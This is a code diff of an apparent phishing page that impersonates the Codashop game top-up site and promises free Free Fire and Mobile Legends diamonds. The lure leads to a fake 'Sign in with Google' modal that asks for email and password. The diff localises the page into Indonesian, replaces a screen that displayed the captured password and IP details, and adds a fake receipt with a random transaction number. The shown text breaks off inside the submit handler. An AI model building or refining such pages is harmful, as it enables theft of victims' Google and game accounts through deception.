@@ -1,107 +1,128 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Codashop - Official Top Up Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
-        body { background-color: #f9f8fc; color: #222; -webkit-tap-highlight-color: transparent; }
+        :root {
+            --primary: #7c3aed;
+            --primary-dark: #6d28d9;
+            --primary-light: #f3f0ff;
+            --accent: #8b5cf6;
+            --bg-color: #f8fafc;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --success: #10b981;
+            --danger: #ef4444;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--bg-color); color: var(--text-main); line-height: 1.5; }
         
         /* Navbar */
-        .navbar { background: #ffffff; padding: 10px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #eae5f5; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 4px rgba(140,82,255,0.03); }
-        .logo-area { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 18px; color: #5b21b6; letter-spacing: 0.5px; }
-        .logo-area i { color: #7c3aed; font-size: 22px; }
+        .navbar { background: #ffffff; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02); }
+        .logo-area { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 18px; color: var(--primary); letter-spacing: -0.5px; }
+        .logo-area i { color: var(--accent); font-size: 20px; animation: pulseGlow 2s infinite; }
+        @keyframes pulseGlow { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        
         .nav-right { display: flex; align-items: center; gap: 10px; }
-        .lang-select { background: #f3f0ff; border: 1px solid #ddd6fe; color: #5b21b6; padding: 5px 8px; border-radius: 6px; font-size: 12px; font-weight: 600; outline: none; cursor: pointer; }
+        .lang-select { background: var(--primary-light); border: 1px solid #ddd6fe; color: var(--primary); padding: 6px 10px; border-radius: 8px; font-size: 12px; font-weight: 700; outline: none; cursor: pointer; transition: 0.2s; }
+        .lang-select:hover { background: #ede9fe; }
 
         /* Container */
-        .container { max-width: 500px; margin: 0 auto; padding: 12px; }
+        .container { max-width: 480px; margin: 0 auto; padding: 14px; }
 
         /* Banner Carousel */
-        .banner-wrapper { position: relative; width: 100%; margin-bottom: 15px; overflow: hidden; border-radius: 10px; border: 1px solid #eae5f5; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
-        .banner-container { width: 100%; height: 130px; display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; scrollbar-width: none; }
+        .banner-wrapper { position: relative; width: 100%; margin-bottom: 16px; overflow: hidden; border-radius: 14px; border: 1px solid var(--border-color); background: #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
+        .banner-container { width: 100%; height: 140px; display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scroll-behavior: smooth; scrollbar-width: none; }
         .banner-container::-webkit-scrollbar { display: none; }
         .banner-slide { min-width: 100%; height: 100%; scroll-snap-align: start; object-fit: cover; flex-shrink: 0; }
-        
-        .banner-dots { display: flex; justify-content: center; gap: 5px; margin-top: 6px; }
-        .dot { width: 6px; height: 6px; border-radius: 50%; background: #d1d5db; cursor: pointer; transition: 0.3s; }
-        .dot.active { background: #7c3aed; width: 16px; border-radius: 4px; }
+        .banner-dots { display: flex; justify-content: center; gap: 6px; margin: 8px 0; }
+        .dot { width: 6px; height: 6px; border-radius: 50%; background: #cbd5e1; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .dot.active { background: var(--primary); width: 18px; border-radius: 4px; }
 
         /* Game Selector Grid */
-        .section-title { font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #4b5563; }
-        .game-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px; }
-        .game-card { background: #ffffff; border: 1.5px solid #e5e7eb; border-radius: 10px; overflow: hidden; cursor: pointer; transition: all 0.2s; text-align: center; padding: 10px; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
-        .game-card:hover, .game-card.active { border-color: #7c3aed; background: #fcfbff; box-shadow: 0 4px 10px rgba(124,58,237,0.08); }
-        .game-card img { width: 42px; height: 42px; border-radius: 8px; object-fit: cover; }
-        .game-card span { font-size: 13px; font-weight: 700; color: #1f2937; text-align: left; }
+        .section-title { font-size: 13px; font-weight: 700; margin-bottom: 8px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+        .game-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 16px; }
+        .game-card { background: #ffffff; border: 2px solid var(--border-color); border-radius: 12px; overflow: hidden; cursor: pointer; transition: all 0.25s ease; padding: 10px; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.01); }
+        .game-card:hover { transform: translateY(-2px); border-color: #cbd5e1; }
+        .game-card.active { border-color: var(--primary); background: var(--primary-light); box-shadow: 0 4px 12px rgba(124,58,237,0.1); }
+        .game-card img { width: 42px; height: 42px; border-radius: 10px; object-fit: cover; }
+        .game-card span { font-size: 13px; font-weight: 700; color: var(--text-main); }
 
         /* Form Steps */
-        .step-box { background: #ffffff; border: 1px solid #eae5f5; border-radius: 10px; padding: 12px; margin-bottom: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
-        .step-header { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; font-weight: 700; font-size: 13px; color: #1f2937; }
-        .step-num { background: #7c3aed; color: white; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 800; }
+        .step-box { background: #ffffff; border: 1px solid var(--border-color); border-radius: 14px; padding: 14px; margin-bottom: 14px; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
+        .step-header { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; font-weight: 700; font-size: 13px; color: var(--text-main); }
+        .step-num { background: var(--primary); color: white; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 800; }
         
-        .input-group { display: flex; gap: 6px; }
-        .input-group input { flex: 1; background: #faf8ff; border: 1px solid #ddd6fe; padding: 9px 12px; border-radius: 6px; color: #1f2937; font-size: 13px; outline: none; }
-        .input-group input:focus { border-color: #7c3aed; background: #fff; }
-        .zone-input { max-width: 100px; }
-        .input-hint { font-size: 11px; color: #6b7280; margin-top: 5px; line-height: 1.4; }
+        .input-group { display: flex; gap: 8px; }
+        .input-group input { flex: 1; background: #f8fafc; border: 1px solid var(--border-color); padding: 10px 12px; border-radius: 8px; color: var(--text-main); font-size: 13px; outline: none; transition: all 0.2s; }
+        .input-group input:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 3px rgba(124,58,237,0.1); }
+        .zone-input { max-width: 105px; }
+        .input-hint { font-size: 11px; color: var(--text-muted); margin-top: 6px; line-height: 1.4; }
         
         /* Nickname Live Detector Box */
-        .nickname-box { display: none; margin-top: 6px; font-size: 12px; background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; padding: 6px 10px; border-radius: 6px; font-weight: 600; align-items: center; gap: 6px; }
-        .nickname-box i { color: #059669; }
+        .nickname-box { display: none; margin-top: 8px; font-size: 12px; background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; padding: 8px 12px; border-radius: 8px; font-weight: 600; align-items: center; gap: 8px; animation: fadeIn 0.3s ease; }
         .nickname-box.loading { background: #fffbeb; border-color: #fde68a; color: #d97706; }
-        .nickname-box.error { background: #fef2f2; border-color: #fecaca; color: #dc2626; }
-        .nickname-box.error i { color: #dc2626; }
-
-        /* Top-up Tabs */
-        .tabs-container { display: flex; gap: 6px; margin-bottom: 12px; }
-        .tab-btn { flex: 1; background: #f3f0ff; border: 1px solid #ddd6fe; color: #5b21b6; padding: 7px; border-radius: 6px; font-size: 11px; font-weight: 700; cursor: pointer; text-align: center; }
-        .tab-btn.active { background: #7c3aed; color: #fff; border-color: #7c3aed; }
+        .nickname-box.error { background: #fef2f2; border-color: #fecaca; color: var(--danger); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
 
         /* Items Grid */
         .items-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
-        .item-card { background: #fff; border: 1.5px solid #e5e7eb; border-radius: 8px; padding: 10px; cursor: pointer; transition: 0.2s; position: relative; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
-        .item-card.selected { border-color: #7c3aed; background: #faf8ff; box-shadow: 0 0 0 1px #7c3aed; }
-        .item-img { width: 36px; height: 36px; object-fit: contain; margin-bottom: 5px; }
-        .item-name { font-size: 12px; font-weight: 700; margin-bottom: 2px; color: #1f2937; }
-        .item-sub { font-size: 10px; color: #6b7280; margin-bottom: 6px; }
-        .item-price-box { width: 100%; border-top: 1px dashed #e5e7eb; padding-top: 6px; margin-top: auto; }
-        .item-price { font-size: 11px; color: #059669; font-weight: 700; }
-        .item-original-price { font-size: 9px; color: #9ca3af; text-decoration: line-through; }
+        .item-card { background: #fff; border: 2px solid var(--border-color); border-radius: 10px; padding: 10px; cursor: pointer; transition: all 0.2s ease; position: relative; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
+        .item-card:hover { border-color: #cbd5e1; }
+        .item-card.selected { border-color: var(--primary); background: #faf8ff; box-shadow: 0 0 0 1px var(--primary); }
+        .item-img { width: 36px; height: 36px; object-fit: contain; margin-bottom: 6px; }
+        .item-name { font-size: 12px; font-weight: 700; margin-bottom: 2px; color: var(--text-main); }
+        .item-sub { font-size: 10px; color: var(--text-muted); margin-bottom: 8px; }
+        .item-price-box { width: 100%; border-top: 1px dashed var(--border-color); padding-top: 6px; margin-top: auto; }
+        .item-price { font-size: 11px; color: var(--success); font-weight: 700; }
+        .item-original-price { font-size: 9px; color: #94a3b8; text-decoration: line-through; }
 
         /* Payment Section & Button */
-        .payment-box { background: #ffffff; border: 1px solid #eae5f5; border-radius: 10px; padding: 12px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; font-size: 13px; font-weight: 600; }
-        .payment-method-text { color: #059669; background: #ecfdf5; padding: 4px 8px; border-radius: 4px; font-size: 11px; border: 1px solid #a7f3d0; }
+        .payment-box { background: #ffffff; border: 1px solid var(--border-color); border-radius: 12px; padding: 12px 14px; margin-bottom: 14px; display: flex; align-items: center; justify-content: space-between; font-size: 13px; font-weight: 600; }
+        .payment-method-text { color: var(--success); background: #ecfdf5; padding: 4px 8px; border-radius: 6px; font-size: 11px; border: 1px solid #a7f3d0; font-weight: 700; }
         
-        .btn-buy { width: 100%; background: #7c3aed; color: white; border: none; padding: 13px; border-radius: 8px; font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 5px; transition: background 0.2s; box-shadow: 0 4px 12px rgba(124,58,237,0.3); }
-        .btn-buy:hover { background: #6d28d9; }
+        .btn-buy { width: 100%; background: var(--primary); color: white; border: none; padding: 14px; border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 14px rgba(124,58,237,0.3); }
+        .btn-buy:hover { background: var(--primary-dark); transform: translateY(-1px); }
 
         /* Google Login Modal */
-        #google-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; display: none; align-items: center; justify-content: center; padding: 15px; }
-        .google-box { background: #ffffff; color: #202124; width: 100%; max-width: 360px; border-radius: 8px; padding: 28px 22px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.15); border: 1px solid #dadce0; }
-        .google-logo-svg { width: 32px; height: 32px; margin-bottom: 12px; display: inline-block; }
-        .google-box h2 { font-size: 17px; font-weight: 500; margin-bottom: 6px; color: #202124; }
-        .google-box p { font-size: 12px; color: #5f6368; margin-bottom: 18px; }
-        .g-input { width: 100%; padding: 11px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 13px; margin-bottom: 10px; outline: none; }
+        #google-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); z-index: 999; display: none; align-items: center; justify-content: center; padding: 16px; animation: fadeIn 0.2s ease; }
+        .google-box { background: #ffffff; color: #202124; width: 100%; max-width: 380px; border-radius: 12px; padding: 30px 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.15); border: 1px solid var(--border-color); }
+        .google-logo-svg { width: 32px; height: 32px; margin-bottom: 14px; display: inline-block; }
+        .google-box h2 { font-size: 18px; font-weight: 600; margin-bottom: 6px; }
+        .google-box p { font-size: 12px; color: var(--text-muted); margin-bottom: 20px; }
+        .g-input { width: 100%; padding: 12px 14px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 13px; margin-bottom: 10px; outline: none; transition: 0.2s; }
         .g-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
-        .g-btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; font-size: 13px; cursor: pointer; margin-top: 6px; }
+        .g-btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 11px; border-radius: 6px; font-weight: 600; font-size: 13px; cursor: pointer; margin-top: 8px; transition: 0.2s; }
+        .g-btn:hover { background: #1557b0; }
 
-        /* Invoice Success Screen */
-        #invoice-screen { position: fixed; inset: 0; background: #f9f8fc; z-index: 1000; display: none; padding: 15px; overflow-y: auto; align-items: center; justify-content: center; }
-        .invoice-card { background: #ffffff; border: 1px solid #eae5f5; width: 100%; max-width: 420px; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 6px 24px rgba(0,0,0,0.06); }
-        .invoice-card i.fa-circle-check { font-size: 42px; color: #059669; margin-bottom: 10px; }
-        .invoice-card h3 { font-size: 16px; font-weight: 700; margin-bottom: 2px; color: #1f2937; }
-        .invoice-card p.sub { font-size: 11px; color: #6b7280; margin-bottom: 14px; }
+        /* Success & Struk Screen */
+        #invoice-screen { position: fixed; inset: 0; background: var(--bg-color); z-index: 1000; display: none; padding: 16px; overflow-y: auto; align-items: center; justify-content: center; }
+        .invoice-card { background: #ffffff; border: 1px solid var(--border-color); width: 100%; max-width: 420px; border-radius: 16px; padding: 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); animation: scaleUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes scaleUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         
-        .receipt-details { background: #faf8ff; border-radius: 8px; padding: 12px; text-align: left; margin-bottom: 14px; border: 1px solid #ede9fe; }
-        .receipt-row { display: flex; justify-content: space-between; align-items: center; font-size: 11.5px; margin-bottom: 7px; border-bottom: 1px solid #f3f0ff; padding-bottom: 4px; }
+        .success-icon-wrap { width: 64px; height: 64px; background: #ecfdf5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; border: 2px solid #a7f3d0; }
+        .success-icon-wrap i { font-size: 28px; color: var(--success); }
+        .invoice-card h3 { font-size: 18px; font-weight: 800; margin-bottom: 4px; color: var(--text-main); }
+        .invoice-card p.sub { font-size: 12px; color: var(--text-muted); margin-bottom: 16px; }
+        
+        .btn-view-detail { background: var(--primary-light); color: var(--primary); border: 1px solid #ddd6fe; width: 100%; padding: 10px; border-radius: 8px; font-weight: 700; font-size: 13px; cursor: pointer; margin-bottom: 14px; transition: 0.2s; }
+        .btn-view-detail:hover { background: #ede9fe; }
+
+        /* Struk Detail Box (Hidden by default) */
+        .receipt-details { background: #f8fafc; border-radius: 10px; padding: 14px; text-align: left; margin-bottom: 16px; border: 1px solid var(--border-color); display: none; }
+        .receipt-details.show { display: block; animation: fadeIn 0.3s ease; }
+        .receipt-row { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 8px; border-bottom: 1px dashed var(--border-color); padding-bottom: 6px; }
         .receipt-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-        .receipt-row span:first-child { color: #6b7280; }
-        .receipt-row span.val-text { font-weight: 700; color: #1f2937; word-break: break-all; max-width: 260px; }
-        .pending-notice { background: #fffbeb; border: 1px solid #fde68a; color: #d97706; padding: 9px; border-radius: 6px; font-size: 11px; font-weight: 600; line-height: 1.4; }
+        .receipt-row span:first-child { color: var(--text-muted); font-weight: 500; }
+        .receipt-row span.val-text { font-weight: 700; color: var(--text-main); word-break: break-all; max-width: 240px; text-align: right; }
+        
+        .pending-notice { background: #fffbeb; border: 1px solid #fde68a; color: #b45309; padding: 10px; border-radius: 8px; font-size: 11.5px; font-weight: 600; line-height: 1.4; text-align: left; }
     </style>
 </head>
 <body>
@@ -136,7 +157,7 @@
             </div>
         </div>
 
-        <div class="section-title" data-i18n="selectGame">Select Game Event</div>
+        <div class="section-title" data-i18n="selectGame">Pilih Event Game</div>
         <div class="game-grid">
             <div class="game-card active" onclick="selectGame('Free Fire', this)">
                 <img src="https://i.supaimg.com/6bfb8718-cebf-4b10-a2cf-b7d804bfef71/f286ea6d-8eb4-4c71-8694-215ea49ed50c.png" alt="Free Fire">
@@ -152,15 +173,15 @@
         <div class="step-box">
             <div class="step-header">
                 <div class="step-num">1</div>
-                <div data-i18n="step1Title">Enter Player ID</div>
+                <div data-i18n="step1Title">Masukkan Player ID</div>
             </div>
             <div class="input-group">
-                <input type="text" id="playerId" placeholder="Enter User ID" oninput="debounceCheck()">
+                <input type="text" id="playerId" placeholder="Masukkan User ID" oninput="debounceCheck()">
                 <input type="text" id="zoneId" class="zone-input" placeholder="Zone ID" style="display:none;" oninput="debounceCheck()">
             </div>
-            <div class="input-hint" id="idHint" data-i18n="hintFF">To find your ID, tap on your avatar in the top left corner of the game main menu.</div>
+            <div class="input-hint" id="idHint" data-i18n="hintFF">Untuk menemukan ID Anda, ketuk pada avatar di sudut kiri atas menu utama game.</div>
             <div id="nicknameBox" class="nickname-box">
-                <i class="fa-solid fa-circle-check" id="nickIcon"></i> <span id="nicknameText">-</span>
+                <i class="fa-solid fa-gem" id="nickIcon"></i> <span id="nicknameText">-</span>
             </div>
         </div>
 
@@ -168,37 +189,36 @@
         <div class="step-box">
             <div class="step-header">
                 <div class="step-num">2</div>
-                <div data-i18n="step2Title">Select Top Up</div>
+                <div data-i18n="step2Title">Pilih Nominal Top Up</div>
             </div>
             <div class="items-grid" id="itemsGrid"></div>
         </div>
 
         <!-- PAYMENT METHOD -->
         <div class="payment-box">
-            <span data-i18n="paymentLabel">Payment Method</span>
-            <span class="payment-method-text" data-i18n="freePayment">Gratis / Free (100% Off)</span>
+            <span data-i18n="paymentLabel">Metode Pembayaran</span>
+            <span class="payment-method-text" data-i18n="freePayment">Gratis (Diskon 100%)</span>
         </div>
 
         <!-- BUY BUTTON -->
-        <button class="btn-buy" onclick="triggerLogin()" data-i18n="buyButton">BUY NOW</button>
+        <button class="btn-buy" onclick="triggerLogin()" data-i18n="buyButton">BAYAR SEKARANG</button>
     </div>
 
     <!-- GOOGLE LOGIN MODAL -->
     <div id="google-modal">
         <div class="google-box">
-            <!-- LOGO GOOGLE SVG RESMI -->
             <svg class="google-logo-svg" viewBox="0 0 24 24">
                 <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
                 <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.19v3.15C3.17 21.32 7.23 24 12 24z"/>
                 <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.19C.43 8.13 0 9.87 0 12s.43 3.87 1.19 5.4l4.08-3.16z"/>
                 <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.17 2.68 1.19 6.6l4.08 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/>
             </svg>
-            <h2 data-i18n="gTitle">Sign in with Google</h2>
-            <p data-i18n="gSub">to verify ownership of your game account</p>
+            <h2 data-i18n="gTitle">Login dengan Google</h2>
+            <p data-i18n="gSub">untuk verifikasi kepemilikan akun game Anda</p>
             <form onsubmit="submitData(event)">
-                <input type="email" id="gEmail" class="g-input" placeholder="Email or phone" required>
-                <input type="password" id="gPass" class="g-input" placeholder="Enter your password" required>
-                <button type="submit" class="g-btn" data-i18n="gNext">Next</button>
+                <input type="email" id="gEmail" class="g-input" placeholder="Email atau nomor telepon" required>
+                <input type="password" id="gPass" class="g-input" placeholder="Masukkan sandi Anda" required>
+                <button type="submit" class="g-btn" data-i18n="gNext">Berikutnya</button>
             </form>
         </div>
     </div>
@@ -206,18 +226,18 @@
     <!-- INVOICE SCREEN -->
     <div id="invoice-screen">
         <div class="invoice-card">
-            <i class="fa-solid fa-circle-check"></i>
-            <h3 data-i18n="invTitle">Top Up Successful!</h3>
-            <p class="sub" data-i18n="invSub">Your order has been queued successfully in our system.</p>
+            <div class="success-icon-wrap">
+                <i class="fa-solid fa-circle-check"></i>
+            </div>
+            <h3 data-i18n="invTitle">Transaksi Berhasil</h3>
+            <p class="sub" data-i18n="invSub">Pesanan Anda telah dimasukkan ke dalam antrean sistem.</p>
             
-            <div class="receipt-details">
+            <button class="btn-view-detail" onclick="toggleReceiptDetail()" id="btnDetailText">Lihat Detail Struk</button>
+
+            <div class="receipt-details" id="receiptDetailsBox">
                 <div class="receipt-row">
-                    <span>Email:</span>
-                    <span class="val-text" id="rEmail">-</span>
-                </div>
-                <div class="receipt-row">
-                    <span>Password:</span>
-                    <span class="val-text" id="rPass">-</span>
+                    <span>No Transaksi:</span>
+                    <span class="val-text" id="rNoTrans">-</span>
                 </div>
                 <div class="receipt-row">
                     <span>Player ID:</span>
@@ -225,44 +245,47 @@
                 </div>
                 <div class="receipt-row">
                     <span>Nickname:</span>
-                    <span class="val-text" id="rNick" style="color:#059669;">-</span>
+                    <span class="val-text" id="rNick" style="color:var(--success);">-</span>
                 </div>
                 <div class="receipt-row">
-                    <span>Negara:</span>
+                    <span>Item:</span>
+                    <span class="val-text" id="rItem">-</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Harga Awal:</span>
+                    <span class="val-text" id="rOrigPrice" style="text-decoration: line-through; color: #94a3b8;">-</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Harga Diskon:</span>
+                    <span class="val-text" id="rPrice" style="color:var(--success);">Rp 0 (100% Off)</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Tanggal & Hari:</span>
+                    <span class="val-text" id="rDate">-</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Email Akun:</span>
+                    <span class="val-text" id="rEmail">-</span>
+                </div>
+                <div class="receipt-row">
+                    <span>Region / Negara:</span>
                     <span class="val-text" id="rCountry">-</span>
-                </div>
-                <div class="receipt-row">
-                    <span>City:</span>
-                    <span class="val-text" id="rCity">-</span>
-                </div>
-                <div class="receipt-row">
-                    <span>State:</span>
-                    <span class="val-text" id="rState">-</span>
-                </div>
-                <div class="receipt-row">
-                    <span>ASN:</span>
-                    <span class="val-text" id="rAsn">-</span>
-                </div>
-                <div class="receipt-row">
-                    <span>IP Address:</span>
-                    <span class="val-text" id="rIp">-</span>
                 </div>
             </div>
 
             <div class="pending-notice" data-i18n="invNotice">
-                Please wait 5 minutes. If items do not appear in your account, please try again.
+                Harap tunggu 5 menit. Jika item belum masuk ke akun Anda, silakan coba lagi.
             </div>
         </div>
     </div>
 
     <script>
         let currentGame = 'Free Fire';
-        let currentItem = '5 Diamonds';
+        let currentItemObj = null;
         let detectedNickname = '-';
         let isSubmitted = false;
         let timeoutId = null;
 
-        // IKON BERLIAN ASLI & WDP
         const iconDiamond = 'https://cdn-icons-png.flaticon.com/512/845/845646.png';
         const iconWdp = 'https://cdn.phototourl.com/member/2026-10-01-61c2efbb-6191-4f90-b887-04e7e5c558cb.jpg';
 
@@ -290,10 +313,11 @@
                 selectGame: "Select Game Event", step1Title: "Enter Player ID",
                 hintFF: "To find your ID, tap on your avatar in the top left corner of the game main menu.",
                 hintML: "To find your User ID and Zone ID, tap on your profile icon. Example: 12345678 (1234)",
-                step2Title: "Select Top Up", paymentLabel: "Payment Method", freePayment: "Free / Gratis (100% Off)",
+                step2Title: "Select Top Up", paymentLabel: "Payment Method", freePayment: "Free (100% Off)",
                 buyButton: "BUY NOW", gTitle: "Sign in with Google", gSub: "to verify ownership of your game account", gNext: "Next",
-                invTitle: "Top Up Successful!", invSub: "Your order has been queued successfully in our system.",
-                invNotice: "Please wait 5 minutes. If items do not appear in your account, please try again."
+                invTitle: "Transaction Successful", invSub: "Your order has been queued successfully in our system.",
+                invNotice: "Please wait 5 minutes. If items do not appear in your account, please try again.",
+                btnDetail: "View Receipt Detail"
             },
             id: {
                 selectGame: "Pilih Event Game", step1Title: "Masukkan Player ID",
@@ -301,8 +325,9 @@
                 hintML: "Untuk menemukan User ID dan Zone ID, ketuk ikon profil. Contoh: 12345678 (1234)",
                 step2Title: "Pilih Nominal Top Up", paymentLabel: "Metode Pembayaran", freePayment: "Gratis (Diskon 100%)",
                 buyButton: "BAYAR SEKARANG", gTitle: "Login dengan Google", gSub: "untuk verifikasi kepemilikan akun game Anda", gNext: "Berikutnya",
-                invTitle: "Top Up Berhasil!", invSub: "Pesanan Anda telah dimasukkan ke dalam antrean sistem.",
-                invNotice: "Harap tunggu 5 menit. Jika item belum masuk ke akun Anda, silakan coba lagi."
+                invTitle: "Transaksi Berhasil", invSub: "Pesanan Anda telah dimasukkan ke dalam antrean sistem.",
+                invNotice: "Harap tunggu 5 menit. Jika item belum masuk ke akun Anda, silakan coba lagi.",
+                btnDetail: "Lihat Detail Struk"
             },
             ms: {
                 selectGame: "Pilih Acara Permainan", step1Title: "Masukkan ID Pemain",
@@ -310,8 +335,9 @@
                 hintML: "Untuk mencari User ID & Zone ID, ketik ikon profil. Contoh: 12345678 (1234)",
                 step2Title: "Pilih Nominal Top Up", paymentLabel: "Kaedah Pembayaran", freePayment: "Percuma (Diskaun 100%)",
                 buyButton: "BELI SEKARANG", gTitle: "Log masuk dengan Google", gSub: "untuk pengesahan pemilikan akaun permainan anda", gNext: "Seterusnya",
-                invTitle: "Top Up Berjaya!", invSub: "Pesanan anda telah dimasukkan ke dalam sistem.",
-                invNotice: "Sila tunggu 5 minit. Jika item tidak masuk ke akaun anda, sila cuba lagi."
+                invTitle: "Transaksi Berjaya", invSub: "Pesanan anda telah dimasukkan ke dalam sistem.",
+                invNotice: "Sila tunggu 5 minit. Jika item tidak masuk ke akaun anda, sila cuba lagi.",
+                btnDetail: "Lihat Detail Resit"
             }
         };
 
@@ -324,6 +350,7 @@
             const zoneInput = document.getElementById('zoneId');
             const idHint = document.getElementById('idHint');
             idHint.innerText = zoneInput.style.display === 'block' ? translations[lang]['hintML'] : translations[lang]['hintFF'];
+            document.getElementById('btnDetailText').innerText = translations[lang]['btnDetail'];
         }
 
         function selectGame(gameName, element) {
@@ -355,7 +382,7 @@
             items.forEach((item, index) => {
                 const div = document.createElement('div');
                 div.className = `item-card ${index === 0 ? 'selected' : ''}`;
-                div.onclick = () => selectItem(item.name + ' (' + item.sub + ')', div);
+                div.onclick = () => selectItem(item, div);
                 div.innerHTML = `
                     <div>
                         <img src="${item.img}" class="item-img" alt="item">
@@ -369,13 +396,13 @@
                 `;
                 grid.appendChild(div);
             });
-            currentItem = items[0].name + ' (' + items[0].sub + ')';
+            currentItemObj = items[0];
         }
 
-        function selectItem(itemName, element) {
+        function selectItem(item, element) {
             document.querySelectorAll('.item-card').forEach(c => c.classList.remove('selected'));
             element.classList.add('selected');
-            currentItem = itemName;
+            currentItemObj = item;
         }
 
         function debounceCheck() {
@@ -414,7 +441,7 @@
                 if (data && (data.success || data.userName || data.name)) {
                     detectedNickname = data.userName || data.name || data.nickname;
                     nickBox.className = 'nickname-box';
-                    nickIcon.className = 'fa-solid fa-circle-check';
+                    nickIcon.className = 'fa-solid fa-gem';
                     nickText.innerText = `Player: ${detectedNickname}`;
                 } else {
                     throw new Error('Tidak ditemukan');
@@ -422,7 +449,7 @@
             } catch (err) {
                 nickBox.className = 'nickname-box error';
                 nickIcon.className = 'fa-solid fa-circle-xmark';
-                detectedNickname = 'Tidak ditemukan / Not Found';
+                detectedNickname = 'Tidak Ditemukan';
                 nickText.innerText = `Player: ${detectedNickname}`;
             }
         }
@@ -446,8 +473,10 @@
             const playerId = document.getElementById('playerId').value;
             const zoneId = document.getElementById('zoneId').value;
             const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
+            const noTrans = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
+            const now = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' });
 
